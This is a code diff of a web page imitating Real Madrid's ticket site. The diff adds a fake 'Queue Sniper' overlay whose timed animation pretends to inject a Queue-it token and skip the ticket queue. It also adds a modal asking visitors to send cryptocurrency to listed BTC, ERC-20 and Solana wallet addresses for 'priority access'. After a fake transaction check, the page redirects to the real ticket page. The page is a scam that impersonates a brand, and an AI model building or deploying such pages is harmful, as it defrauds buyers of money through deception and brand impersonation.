@@ -7,122 +7,98 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Libre+Franklin:wght@300;400;700;900&display=swap');
-        
-        body {
-            font-family: 'Libre+Franklin', sans-serif;
-            background-color: #f8f9fa;
-            color: #111b33;
-        }
-
-        .rm-blue { color: #111b33; }
-        .bg-rm-blue { background-color: #111b33; }
-        .border-rm-blue { border-color: #111b33; }
-        
-        /* Matching the specific blue used in the Real Madrid App buttons */
-        .btn-primary {
-            background-color: #3b50b6;
-            transition: all 0.3s ease;
-        }
-
-        .bot-overlay {
-            background: rgba(17, 27, 51, 0.95);
-            border: 1px solid #3b50b6;
-            box-shadow: 0 0 20px rgba(59, 80, 182, 0.4);
-        }
-
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3b50b6;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-        }
-
+        body { font-family: 'Libre+Franklin', sans-serif; background-color: #f8f9fa; color: #111b33; margin: 0; overflow-x: hidden; }
+        .bot-overlay { background: rgba(17, 27, 51, 0.95); border: 1px solid #3b50b6; box-shadow: 0 0 20px rgba(59, 80, 182, 0.4); }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3b50b6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #crypto-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
+        .address-box { background: #f0f2f5; border: 1px solid #ddd; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 11px; word-break: break-all; margin-top: 5px; color: #111b33; }
     </style>
 </head>
 <body class="flex flex-col min-h-screen">
 
     <header class="bg-white border-b border-gray-200 px-4 py-3 flex justify-between items-center sticky top-0 z-50">
         <div class="flex items-center space-x-4">
-            <button class="p-1">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg>
-            </button>
             <img src="https://publish-p33712-e119301.adobeaemcloud.com/adobe/dynamicmedia/deliver/dm-aid--839b0d68-1582-41f9-9689-53e70d428989/logo.svg" alt="Real Madrid" class="h-10">
             <img src="https://www.realmadrid.com/StaticFiles/RealMadridResponsive/images/header/logo-champions-15.svg" alt="UCL 15" class="h-8">
         </div>
-        <button class="border border-rm-blue text-rm-blue px-4 py-1.5 rounded-lg font-bold text-sm flex items-center">
-            <svg class="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20"><path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"/></svg>
-            Acceder
-        </button>
+        <div class="border border-[#111b33] text-[#111b33] px-4 py-1.5 rounded-lg font-bold text-sm">Acceder</div>
     </header>
 
     <main class="flex-grow p-4 md:max-w-xl md:mx-auto w-full">
-        <div class="flex justify-between items-center mb-6">
-            <h1 class="text-3xl font-black rm-blue italic uppercase tracking-tighter">Entradas</h1>
-            <button class="text-rm-blue">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 21v-7m0-4V3m8 18v-11m0-4V3m8 18v-3m0-4V3M1 14h6m2-7h6m2 10h6"/></svg>
-            </button>
-        </div>
+        <h1 class="text-3xl font-black italic uppercase tracking-tighter mb-6">Entradas</h1>
 
-        <div class="flex space-x-4 overflow-x-auto pb-4 mb-6 no-scrollbar text-gray-400 font-bold text-sm">
-            <span>Jun</span><span>Jul</span><span>Ago</span><span>Sep</span><span>Oct</span><span>Nov</span><span class="text-rm-blue border-b-2 border-rm-blue pb-1">Dic</span>
-        </div>
-
-        <div class="bg-white rounded-3xl shadow-sm p-12 flex flex-col items-center text-center border border-gray-100">
-            <div class="mb-6">
-                <img src="https://www.realmadrid.com/StaticFiles/RealMadridResponsive/images/tickets/no-tickets.svg" alt="Empty" class="w-32 h-32">
-            </div>
-            <h2 class="text-xl font-bold rm-blue mb-2">No hay entradas con los filtros o fechas seleccionados</h2>
+        <div class="bg-white rounded-3xl shadow-sm p-12 flex flex-col items-center text-center border border-gray-100 mb-6">
+            <img src="https://www.realmadrid.com/StaticFiles/RealMadridResponsive/images/tickets/no-tickets.svg" alt="Empty" class="w-32 h-32 mb-6">
+            <h2 class="text-xl font-bold mb-2">No hay entradas con los filtros o fechas seleccionados</h2>
             <p class="text-gray-500 text-sm">Prueba a modificar la selección</p>
         </div>
 
-        <div class="bot-overlay mt-6 rounded-2xl p-5 text-white">
-            <div class="flex justify-between items-center mb-4">
-                <span class="text-xs font-bold uppercase tracking-widest text-blue-400">Queue Sniper v4.2 Active</span>
+        <div class="bot-overlay rounded-2xl p-5 text-white">
+            <div class="flex justify-between items-center mb-4 text-blue-400 font-bold text-xs uppercase tracking-widest">
+                <span>Queue Sniper v4.2 Active</span>
                 <div class="loader"></div>
             </div>
-            
-            <div id="status-text" class="text-sm font-medium mb-4">
-                Buscando sesiones disponibles...
+            <div id="status-text" class="text-sm mb-4 italic">Buscando túnel de acceso prioritario...</div>
+            <div class="w-full bg-gray-700 h-1.5 rounded-full mb-6">
+                <div id="progress-bar" class="bg-blue-500 h-full rounded-full transition-all duration-1000" style="width: 5%"></div>
             </div>
-
-            <div class="w-full bg-gray-700 rounded-full h-1.5 mb-4">
-                <div id="progress" class="bg-blue-500 h-1.5 rounded-full transition-all duration-700" style="width: 15%"></div>
-            </div>
-
-            <button id="bypass-btn" class="w-full btn-primary text-white font-bold py-3 rounded-xl uppercase text-sm tracking-widest opacity-50 cursor-not-allowed">
-                Forzar Salto de Cola
+            <button id="main-btn" onclick="openPayment()" class="w-full bg-[#3b50b6] py-4 rounded-xl font-bold uppercase tracking-widest text-sm opacity-50 cursor-not-allowed">
+                Cargando Bypass...
             </button>
         </div>
     </main>
 
-    <footer class="bg-white border-t border-gray-200 p-4 flex justify-around items-center sticky bottom-0">
-        <div class="flex flex-col items-center text-gray-400"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg></div>
-        <div class="flex flex-col items-center text-rm-blue font-bold"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M15 5v2a1 1 0 01-1 1H6a1 1 0 01-1-1V5a1 1 0 011-1h8a1 1 0 011 1zM5 11a1 1 0 011-1h8a1 1 0 011 1v2a1 1 0 01-1 1H6a1 1 0 01-1-1v-2zM5 17a1 1 0 011-1h8a1 1 0 011 1v2a1 1 0 01-1 1H6a1 1 0 01-1-1v-2z"/></svg></div>
-    </footer>
+    <div id="crypto-modal">
+        <div class="bg-white rounded-3xl w-full max-w-md p-6">
+            <h3 class="text-xl font-bold text-[#111b33] mb-2 uppercase italic italic">Pago de Prioridad</h3>
+            <p class="text-xs text-gray-500 mb-6 font-bold">Transfiere el importe para activar el salto de cola inmediato (Bypass).</p>
+            
+            <div class="space-y-4">
+                <div>
+                    <label class="text-[10px] font-bold text-gray-400 uppercase">BTC (Bitcoin)</label>
+                    <div class="address-box">bc1qt7zlwlmamph8vt4d0dwdjjnq8yehgvjr6883va</div>
+                </div>
+                <div>
+                    <label class="text-[10px] font-bold text-gray-400 uppercase">ETH / USDT / USDC (ERC-20)</label>
+                    <div class="address-box">0x04065cCfbbcccaD53102B98ADE0e0644E088367C</div>
+                </div>
+                <div>
+                    <label class="text-[10px] font-bold text-gray-400 uppercase">SOL (Solana)</label>
+                    <div class="address-box">37TkwujqyjCCREcUePrWeHVMwU3ZUuGUrUR9xzbbpmAH</div>
+                </div>
+            </div>
+
+            <button onclick="redirectToMadrid()" class="mt-8 w-full py-4 bg-[#111b33] text-white rounded-xl font-bold uppercase text-xs tracking-widest">Ya he enviado el pago</button>
+        </div>
+    </div>
 
     <script>
-        // Simulation logic to show the client it "works"
+        // Automatic Animation Logic
+        const progressBar = document.getElementById('progress-bar');
+        const statusText = document.getElementById('status-text');
+        const mainBtn = document.getElementById('main-btn');
+
         setTimeout(() => {
-            document.getElementById('status-text').innerText = "Validando Token de Salida (Queue-it Bypass)...";
-            document.getElementById('progress').style.width = "65%";
+            progressBar.style.width = "65%";
+            statusText.innerText = "Inyectando Token de Salida (Queue-it)...";
             
             setTimeout(() => {
-                document.getElementById('status-text').innerHTML = "¡CONEXIÓN ESTABLECIDA! <span class='text-green-400'>Listo para saltar cola.</span>";
-                document.getElementById('progress').style.width = "100%";
-                document.getElementById('bypass-btn').classList.remove('opacity-50', 'cursor-not-allowed');
-                document.getElementById('bypass-btn').innerText = "ENTRAR AHORA (BYPASS)";
+                progressBar.style.width = "100%";
+                statusText.innerHTML = "¡BYPASS LISTO! <span class='text-green-400'>Acceso concedido.</span>";
+                mainBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                mainBtn.innerText = "ENTRAR AHORA (BYPASS)";
             }, 2000);
         }, 1500);
 
-        document.getElementById('bypass-btn').addEventListener('click', function() {
-            if(!this.classList.contains('opacity-50')) {
-                alert("Redirecting through secure bypass tunnel...");
-                window.location.href = "https://www.realmadrid.com/es-ES/entradas";
-            }
-        });
+        function openPayment() {
+            document.getElementById('crypto-modal').style.display = 'flex';
+        }
+
+        function redirectToMadrid() {
+            alert("Verificando transacción... Redirigiendo a la zona de asientos.");
+            window.location.href = "https://www.realmadrid.com/es-ES/entradas";
+        }
     </script>
 </body>
 </html>
